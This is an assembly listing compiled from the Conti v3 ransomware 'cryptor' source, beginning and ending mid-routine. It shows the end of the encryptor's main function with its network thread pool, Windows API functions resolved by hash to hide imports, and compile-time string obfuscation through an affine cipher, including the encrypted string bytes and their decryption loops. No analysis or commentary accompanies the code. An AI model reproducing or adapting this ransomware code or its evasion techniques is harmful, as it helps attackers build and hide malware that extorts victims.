; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00c5c	44 8d 4a 3b	 lea	 r9d, QWORD PTR [rdx+59]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 229  : 	TAILQ_INSERT_TAIL(&ThreadPoolInfo->TaskList, Task, Entries);

  00c60	48 89 18	 mov	 QWORD PTR [rax], rbx
  00c63	48 89 0d 48 00
	00 00		 mov	 QWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+72, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00c6a	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 415  : 	return pFunction(lpCriticalSection);

  00c6f	48 8d 0d 18 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A+24
  00c76	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 265  : 	for (SIZE_T i = 0; i < ThreadPoolInfo->ThreadsCount; i++) {

  00c78	48 ff c7	 inc	 rdi
  00c7b	48 3b 3d 08 00
	00 00		 cmp	 rdi, QWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+8
  00c82	0f 82 68 ff ff
	ff		 jb	 $LL875@WinMain
$LN874@WinMain:

; 269  : 	pWaitForMultipleObjects(ThreadPoolInfo->ThreadsCount, ThreadPoolInfo->hThreads, TRUE, INFINITE);

  00c88	48 8b 1d 00 00
	00 00		 mov	 rbx, QWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 577  : 	pFunction = (DWORD(WINAPI*)(DWORD, const HANDLE*, BOOL, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x78b61591, 58);//GetProcAddress(hKernel32, OBFA("WaitForMultipleObjects"));

  00c8f	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 269  : 	pWaitForMultipleObjects(ThreadPoolInfo->ThreadsCount, ThreadPoolInfo->hThreads, TRUE, INFINITE);

  00c94	8b 3d 08 00 00
	00		 mov	 edi, DWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+8
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 577  : 	pFunction = (DWORD(WINAPI*)(DWORD, const HANDLE*, BOOL, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x78b61591, 58);//GetProcAddress(hKernel32, OBFA("WaitForMultipleObjects"));

  00c9a	41 b8 91 15 b6
	78		 mov	 r8d, 2025198993		; 78b61591H
  00ca0	44 8d 4a 2b	 lea	 r9d, QWORD PTR [rdx+43]
  00ca4	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 578  : 	return pFunction(nCount, lpHandles, bWaitAll, dwMilliseconds);

  00ca9	41 b9 ff ff ff
	ff		 mov	 r9d, -1			; ffffffffH
  00caf	41 b8 01 00 00
	00		 mov	 r8d, 1
  00cb5	48 8b d3	 mov	 rdx, rbx
  00cb8	8b cf		 mov	 ecx, edi
  00cba	ff d0		 call	 rax
$LN872@WinMain:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 337  : 	return EXIT_SUCCESS;

  00cbc	33 c0		 xor	 eax, eax
  00cbe	eb 05		 jmp	 SHORT $LN1@WinMain
$LN1183@WinMain:

; 283  : 
; 284  : 		if (!threadpool::Create(threadpool::NETWORK_THREADPOOL, ThreadsCountForPool)) {
; 285  : 			return EXIT_FAILURE;

  00cc0	b8 01 00 00 00	 mov	 eax, 1
$LN1@WinMain:

; 338  : }

  00cc5	48 8b 4d 3f	 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-169]
  00cc9	48 33 cc	 xor	 rcx, rsp
  00ccc	e8 00 00 00 00	 call	 __security_check_cookie
  00cd1	4c 8d 9c 24 f0
	00 00 00	 lea	 r11, QWORD PTR [rsp+240]
  00cd9	49 8b 5b 20	 mov	 rbx, QWORD PTR [r11+32]
  00cdd	49 8b 73 28	 mov	 rsi, QWORD PTR [r11+40]
  00ce1	49 8b 7b 30	 mov	 rdi, QWORD PTR [r11+48]
  00ce5	49 8b e3	 mov	 rsp, r11
  00ce8	41 5f		 pop	 r15
  00cea	41 5e		 pop	 r14
  00cec	5d		 pop	 rbp
  00ced	c3		 ret	 0
WinMain	ENDP
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 1a 00 00
	00		 mov	 r11d, 26
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 60	 sub	 ecx, 96			; 00000060H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 19	 imul	 r8d, ecx, 25

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 5a	 mov	 BYTE PTR [rcx+1], 90	; 0000005aH
  00007	c6 41 02 7e	 mov	 BYTE PTR [rcx+2], 126	; 0000007eH
  0000b	c6 41 03 5f	 mov	 BYTE PTR [rcx+3], 95	; 0000005fH
  0000f	c6 41 04 55	 mov	 BYTE PTR [rcx+4], 85	; 00000055H
  00013	c6 41 05 79	 mov	 BYTE PTR [rcx+5], 121	; 00000079H
  00017	c6 41 06 79	 mov	 BYTE PTR [rcx+6], 121	; 00000079H
  0001b	c6 41 07 13	 mov	 BYTE PTR [rcx+7], 19
  0001f	c6 41 08 55	 mov	 BYTE PTR [rcx+8], 85	; 00000055H
  00023	c6 41 09 2d	 mov	 BYTE PTR [rcx+9], 45	; 0000002dH
  00027	c6 41 0a 50	 mov	 BYTE PTR [rcx+10], 80	; 00000050H
  0002b	c6 41 0b 09	 mov	 BYTE PTR [rcx+11], 9
  0002f	c6 41 0c 04	 mov	 BYTE PTR [rcx+12], 4
  00033	c6 41 0d 79	 mov	 BYTE PTR [rcx+13], 121	; 00000079H
  00037	c6 41 0e 62	 mov	 BYTE PTR [rcx+14], 98	; 00000062H
  0003b	c6 41 0f 53	 mov	 BYTE PTR [rcx+15], 83	; 00000053H
  0003f	c6 41 10 09	 mov	 BYTE PTR [rcx+16], 9
  00043	c6 41 11 2c	 mov	 BYTE PTR [rcx+17], 44	; 0000002cH
  00047	c6 41 12 55	 mov	 BYTE PTR [rcx+18], 85	; 00000055H
  0004b	c6 41 13 5a	 mov	 BYTE PTR [rcx+19], 90	; 0000005aH
  0004f	c6 41 14 16	 mov	 BYTE PTR [rcx+20], 22
  00053	c6 41 15 62	 mov	 BYTE PTR [rcx+21], 98	; 00000062H
  00057	c6 41 16 16	 mov	 BYTE PTR [rcx+22], 22
  0005b	c6 41 17 25	 mov	 BYTE PTR [rcx+23], 37	; 00000025H
  0005f	c6 41 18 11	 mov	 BYTE PTR [rcx+24], 17
  00063	c6 41 19 67	 mov	 BYTE PTR [rcx+25], 103	; 00000067H
  00067	c6 41 1a 60	 mov	 BYTE PTR [rcx+26], 96	; 00000060H
  0006b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0006f	48 8b c1	 mov	 rax, rcx
  00072	c3		 ret	 0
??0?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 10 00 00
	00		 mov	 r10d, 16
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 65 00 00 00	 mov	 eax, 101		; 00000065H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 2b	 mov	 BYTE PTR [rcx+1], 43	; 0000002bH
  00007	c6 41 02 65	 mov	 BYTE PTR [rcx+2], 101	; 00000065H
  0000b	c6 41 03 29	 mov	 BYTE PTR [rcx+3], 41	; 00000029H
  0000f	c6 41 04 65	 mov	 BYTE PTR [rcx+4], 101	; 00000065H
  00013	c6 41 05 2d	 mov	 BYTE PTR [rcx+5], 45	; 0000002dH
  00017	c6 41 06 65	 mov	 BYTE PTR [rcx+6], 101	; 00000065H
  0001b	c6 41 07 3d	 mov	 BYTE PTR [rcx+7], 61	; 0000003dH
  0001f	c6 41 08 65	 mov	 BYTE PTR [rcx+8], 101	; 00000065H
  00023	c6 41 09 51	 mov	 BYTE PTR [rcx+9], 81	; 00000051H
  00027	c6 41 0a 65	 mov	 BYTE PTR [rcx+10], 101	; 00000065H
  0002b	c6 41 0b 47	 mov	 BYTE PTR [rcx+11], 71	; 00000047H
  0002f	c6 41 0c 65	 mov	 BYTE PTR [rcx+12], 101	; 00000065H
  00033	c6 41 0d 4d	 mov	 BYTE PTR [rcx+13], 77	; 0000004dH
  00037	c6 41 0e 65	 mov	 BYTE PTR [rcx+14], 101	; 00000065H
  0003b	c6 41 0f 65	 mov	 BYTE PTR [rcx+15], 101	; 00000065H
  0003f	c6 41 10 65	 mov	 BYTE PTR [rcx+16], 101	; 00000065H
  00043	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00047	48 8b c1	 mov	 rax, rcx
  0004a	c3		 ret	 0
??0?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 08 00 00
	00		 mov	 r10d, 8
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 08 00 00 00	 mov	 eax, 8
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c 40	 lea	 ecx, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 03	 shl	 ecx, 3

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 0e	 mov	 BYTE PTR [rcx+1], 14
  00007	c6 41 02 08	 mov	 BYTE PTR [rcx+2], 8
  0000b	c6 41 03 3e	 mov	 BYTE PTR [rcx+3], 62	; 0000003eH
  0000f	c6 41 04 08	 mov	 BYTE PTR [rcx+4], 8
  00013	c6 41 05 6d	 mov	 BYTE PTR [rcx+5], 109	; 0000006dH
  00017	c6 41 06 08	 mov	 BYTE PTR [rcx+6], 8
  0001b	c6 41 07 08	 mov	 BYTE PTR [rcx+7], 8
  0001f	c6 41 08 08	 mov	 BYTE PTR [rcx+8], 8
  00023	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00027	48 8b c1	 mov	 rax, rcx
  0002a	c3		 ret	 0
??0?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CP@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<47,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0c 00 00
	00		 mov	 r10d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 1b 00 00 00	 mov	 eax, 27
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 1b	 imul	 ecx, eax, 27

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
